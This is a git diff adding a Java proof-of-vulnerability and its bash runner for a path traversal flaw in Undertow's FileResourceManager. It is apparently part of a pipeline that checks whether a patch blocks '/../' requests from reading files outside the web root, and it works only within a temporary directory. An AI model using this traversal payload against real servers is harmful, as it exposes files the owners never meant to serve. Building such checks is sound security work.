@@ -1,0 +1,140 @@
+diff --git a/.security-pipeline/pov/PovPathTraversal.java b/.security-pipeline/pov/PovPathTraversal.java
+new file mode 100644
+index 0000000..b9ac3e2
+--- /dev/null
++++ b/.security-pipeline/pov/PovPathTraversal.java
+@@ -0,0 +1,101 @@
++/*
++ * Proof-of-Vulnerability for CWE-022 (Path Traversal) in Undertow.
++ *
++ * Exercises the real vulnerable code path:
++ *   io.undertow.server.handlers.resource.FileResourceManager#getResource(String)
++ *
++ * FileResourceManager.getResource() resolves the request path against the
++ * configured base directory with `new File(base, path)` and returns the file
++ * as long as it exists, WITHOUT verifying that the resolved (canonical) file
++ * still lives inside the base directory. A request path that contains ".."
++ * segments therefore escapes the base directory and exposes arbitrary files
++ * on the filesystem (CVE-2014-7816 family).
++ *
++ * This POV:
++ *   1. Creates a base directory that FileResourceManager is allowed to serve.
++ *   2. Writes a secret file OUTSIDE the base directory.
++ *   3. Asks FileResourceManager.getResource("../<secret>") for that file.
++ *   4. Proves that the returned resource points at the out-of-base secret and
++ *      that its contents can be read.
++ *
++ * Exit 0  -> traversal succeeded == VULNERABLE (unpatched code).
++ * Exit !=0 -> getResource refused to escape the base == PATCHED / safe.
++ */
++
++import io.undertow.server.handlers.resource.FileResource;
++import io.undertow.server.handlers.resource.FileResourceManager;
++import io.undertow.server.handlers.resource.Resource;
++
++import java.io.File;
++import java.io.FileWriter;
++import java.io.Writer;
++import java.nio.file.Files;
++
++public class PovPathTraversal {
++
++    public static void main(String[] args) throws Exception {
++        // Sandbox root for the POV.
++        File tmpRoot = Files.createTempDirectory("pov-undertow-").toFile();
++        File base = new File(tmpRoot, "webroot");
++        if (!base.mkdirs()) {
++            throw new IllegalStateException("could not create base dir");
++        }
++
++        // A legitimate file inside the served base directory.
++        writeFile(new File(base, "index.html"), "public content");
++
++        // The SECRET file lives OUTSIDE the base directory (sibling of webroot).
++        final String secretContent = "TOP-SECRET-" + Long.toHexString(base.hashCode());
++        File secret = new File(tmpRoot, "secret.txt");
++        writeFile(secret, secretContent);
++
++        // Configure the resource manager to only serve `base`.
++        FileResourceManager mgr = new FileResourceManager(base, 1024);
++
++        // Attacker-controlled request path with a traversal segment.
++        final String maliciousPath = "/../secret.txt";
++        Resource resource = mgr.getResource(maliciousPath);
++
++        if (resource == null) {
++            System.out.println("[POV] getResource('" + maliciousPath
++                    + "') returned null -> traversal blocked. NOT vulnerable.");
++            System.exit(1);
++        }
++
++        File served = ((FileResource) resource).getFile();
++        String servedCanonical = served.getCanonicalPath();
++        String baseCanonical = base.getCanonicalPath();
++        String secretCanonical = secret.getCanonicalPath();
++
++        boolean escapedBase = !servedCanonical.startsWith(baseCanonical + File.separator)
++                && !servedCanonical.equals(baseCanonical);
++        boolean isSecret = servedCanonical.equals(secretCanonical);
++
++        String readBack = new String(Files.readAllBytes(served.toPath()), "UTF-8");
++        boolean leakedSecret = readBack.equals(secretContent);
++
++        System.out.println("[POV] base    = " + baseCanonical);
++        System.out.println("[POV] served  = " + servedCanonical);
++        System.out.println("[POV] secret  = " + secretCanonical);
++        System.out.println("[POV] escapedBase=" + escapedBase
++                + " isSecret=" + isSecret + " leakedSecret=" + leakedSecret);
++
++        if (escapedBase && isSecret && leakedSecret) {
++            System.out.println("[POV] VULNERABLE: path traversal escaped the base "
++                    + "directory and leaked out-of-base file contents: \"" + readBack + "\"");
++            System.exit(0);
++        }
++
++        System.out.println("[POV] Resolved file stayed within base -> NOT vulnerable.");
++        System.exit(2);
++    }
++
++    private static void writeFile(File f, String content) throws Exception {
++        Writer w = new FileWriter(f);
++        try {
++            w.write(content);
++        } finally {
++            w.close();
++        }
++    }
++}
+diff --git a/.security-pipeline/pov/run_pov.sh b/.security-pipeline/pov/run_pov.sh
+new file mode 100755
+index 0000000..4607b20
+--- /dev/null
++++ b/.security-pipeline/pov/run_pov.sh
+@@ -0,0 +1,27 @@
++#!/usr/bin/env bash
++# POV runner for CWE-022 path traversal in Undertow FileResourceManager.
++# Runs inside the project container at /workspace/repo.
++# Exit 0  -> vulnerability reproduced (unpatched code).
++# Exit !=0 -> vulnerability not reproduced (patched code).
++set -euo pipefail
++
++REPO="/workspace/repo"
++POV_DIR="${REPO}/.security-pipeline/pov"
++M2="${HOME}/.m2/repository"
++
++cd "${REPO}"
++
++# Ensure the vulnerable product classes are compiled (offline).
++if [ ! -d "${REPO}/core/target/classes/io/undertow/server/handlers/resource" ]; then
++  mvn -B -o -q -DskipTests -pl core -am compile
++fi
++
++XNIO_API="$(find "${M2}" -name 'xnio-api-*.jar' | head -1)"
++JBOSS_LOGGING="$(find "${M2}" -name 'jboss-logging-3*.jar' | head -1)"
++
++CP="${REPO}/core/target/classes:${XNIO_API}:${JBOSS_LOGGING}"
++
++WORK="$(mktemp -d)"
++javac -cp "${CP}" -d "${WORK}" "${POV_DIR}/PovPathTraversal.java"
++
++java -cp "${CP}:${WORK}" PovPathTraversal
